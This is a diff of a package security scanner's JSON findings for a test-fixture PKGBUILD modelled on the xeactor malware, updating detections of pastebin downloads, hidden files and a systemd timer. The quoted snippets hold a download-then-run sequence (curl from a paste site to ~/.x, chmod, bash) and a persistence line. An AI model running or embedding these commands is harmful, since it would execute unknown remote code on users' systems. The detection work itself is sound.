@@ -21,24 +21,6 @@
       }
     },
     {
-      "id": "PASTE-001",
-      "severity": "critical",
-      "category": "malicious_code",
-      "title": "Pastebin download",
-      "description": "Downloading from paste sites is a common malware technique. Used in 2018 xeactor attack via ptpb.pw",
-      "location": {
-        "file": "tests/fixtures/malicious/xeactor-style/PKGBUILD",
-        "line": 15,
-        "column": 10,
-        "snippet": "    curl https://ptpb.pw/~x -o ~/.x"
-      },
-      "recommendation": "Never download code from paste sites - this is a major red flag",
-      "cwe_id": "CWE-506",
-      "metadata": {
-        "matched_text": "https://ptpb.pw/"
-      }
-    },
-    {
       "id": "PERSIST-002",
       "severity": "critical",
       "category": "persistence",
@@ -47,13 +29,13 @@
       "location": {
         "file": "tests/fixtures/malicious/xeactor-style/PKGBUILD",
         "line": 26,
-        "column": 56,
+        "column": 55,
         "snippet": "    cat > \"${pkgdir}/etc/systemd/system/acroread-update.timer\" << EOF"
       },
       "recommendation": "Timers should be user-controlled; review carefully",
       "cwe_id": "CWE-506",
       "metadata": {
-        "matched_text": ".timer"
+        "matched_text": "e.timer"
       }
     },
     {
@@ -93,6 +75,28 @@
       }
     },
     {
+      "id": "EXEC-REMOTE",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Runs code fetched from https://ptpb.pw/~x",
+      "description": "This package fetches code from https://ptpb.pw/~x (as downloaded file `~/.x`) and then runs it. The scanner does NOT follow that reference, so what executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at build/install time.",
+      "location": {
+        "file": "tests/fixtures/malicious/xeactor-style/PKGBUILD",
+        "line": 19,
+        "column": null,
+        "snippet": "bash ~/.x"
+      },
+      "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "flow": "download-then-run",
+        "opaque_boundary": true,
+        "remote_urls": [
+          "https://ptpb.pw/~x"
+        ]
+      }
+    },
+    {
       "id": "HIDDEN-001",
       "severity": "high",
       "category": "malicious_code",
@@ -101,49 +105,13 @@
       "location": {
         "file": "tests/fixtures/malicious/xeactor-style/PKGBUILD",
         "line": 15,
-        "column": 32,
+        "column": 28,
         "snippet": "    curl https://ptpb.pw/~x -o ~/.x"
       },
       "recommendation": "Packages should not create hidden files in user home",
       "cwe_id": null,
       "metadata": {
-        "matched_text": "~/.x"
-      }
-    },
-    {
-      "id": "HIDDEN-001",
-      "severity": "high",
-      "category": "malicious_code",
-      "title": "Hidden file creation in home",
-      "description": "Creating hidden files in user home directory",
-      "location": {
-        "file": "tests/fixtures/malicious/xeactor-style/PKGBUILD",
-        "line": 16,
-        "column": 14,
-        "snippet": "    chmod +x ~/.x"
-      },
-      "recommendation": "Packages should not create hidden files in user home",
-      "cwe_id": null,
-      "metadata": {
-        "matched_text": "~/.x"
-      }
-    },
-    {
-      "id": "HIDDEN-001",
-      "severity": "high",
-      "category": "malicious_code",
-      "title": "Hidden file creation in home",
-      "description": "Creating hidden files in user home directory",
-      "location": {
-        "file": "tests/fixtures/malicious/xeactor-style/PKGBUILD",
-        "line": 19,
-        "column": 10,
-        "snippet": "    bash ~/.x"
-      },
-      "recommendation": "Packages should not create hidden files in user home",
-      "cwe_id": null,
-      "metadata": {
-        "matched_text": "~/.x"
+        "matched_text": " -o ~/.x"
       }
     },
     {
@@ -185,6 +153,6 @@
   "scanned_files": [
     "tests/fixtures/malicious/xeactor-style/PKGBUILD"
   ],
-  "timestamp": "2026-06-15T13:48:50.879196202Z",
-  "scan_duration_ms": 7
+  "timestamp": "2026-11-10T14:51:11.585610361Z",
+  "scan_duration_ms": 19
 }
